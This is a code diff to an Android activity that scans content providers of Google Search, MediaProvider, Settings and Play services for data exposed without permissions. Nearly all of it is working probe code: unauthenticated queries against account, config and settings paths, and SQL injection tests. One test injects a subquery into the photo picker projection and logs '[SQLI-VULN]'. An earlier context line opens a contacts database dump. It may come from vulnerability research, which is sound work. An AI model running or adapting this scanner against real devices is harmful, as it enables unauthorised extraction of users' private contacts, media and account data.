@@ -176,6 +176,45 @@ public class ProviderDeepScanActivity extends Activity {
             testOpenFile("DumpFile:" + hex, "com.android.contacts.dumpfile", hex + "-contacts-db.zip");
         }
 
+        log("\n=== GsaPublicContentProvider (AGSA - NO PERM) ===");
+        testQuery("AGSA:PublicCP", "com.google.android.googlequicksearchbox.GsaPublicContentProvider", null);
+        testQuery("AGSA:PublicCP/", "com.google.android.googlequicksearchbox.GsaPublicContentProvider", "");
+        testQuery("AGSA:PublicCP/search", "com.google.android.googlequicksearchbox.GsaPublicContentProvider", "search");
+        testQuery("AGSA:PublicCP/config", "com.google.android.googlequicksearchbox.GsaPublicContentProvider", "config");
+        testQuery("AGSA:PublicCP/settings", "com.google.android.googlequicksearchbox.GsaPublicContentProvider", "settings");
+        testQuery("AGSA:PublicCP/account", "com.google.android.googlequicksearchbox.GsaPublicContentProvider", "account");
+        testSqli("AGSA:PublicCP", "com.google.android.googlequicksearchbox.GsaPublicContentProvider", null);
+
+        log("\n=== AGSA Tips Providers (NO PERM) ===");
+        testQuery("InterpreterTips", "com.google.android.apps.search.assistant.surfaces.voice.ui.interpreter.tips.configuration.TIPS_CONFIG_PROVIDER", null);
+        testQuery("SmartspaceTips", "com.google.android.apps.search.assistant.verticals.ambient.smartspace.tips.configuration.TIPS_CONFIG_PROVIDER", null);
+
+        log("\n=== MediaProvider Photo Picker SQLi ===");
+        testSqli("MediaProvider:images", "media", "external/images");
+        testSqli("MediaProvider:video", "media", "external/video");
+        testSqli("MediaProvider:audio", "media", "external/audio");
+        testSqli("MediaProvider:files", "media", "external/file");
+        // Test PickerDbFacade path
+        try {
+            Cursor c = getContentResolver().query(
+                Uri.parse("content://media/picker/0/com.google.android.providers.media.photopicker/media"),
+                new String[]{"_id", "(SELECT sqlite_version()) AS ver"}, null, null, null);
+            if (c != null && c.moveToFirst()) {
+                int idx = c.getColumnIndex("ver");
+                if (idx >= 0) {
+                    log("[SQLI-VULN] MediaProvider:picker projection: SQLite " + c.getString(idx));
+                }
+                c.close();
+            }
+        } catch (Exception e) {
+            log("[MediaPicker] " + e.getClass().getSimpleName() + ": " +
+                (e.getMessage() != null ? e.getMessage().substring(0, Math.min(e.getMessage().length(), 80)) : "null"));
+        }
+
+        log("\n=== SliceProvider Scan ===");
+        testQuery("Settings:Slice", "com.android.settings.slices", "action/wifi");
+        testQuery("GMS:Slice", "com.google.android.gms.nearby.fastpair.slice", null);
+
         log("\n=== SCAN COMPLETE ===");
     }
 }
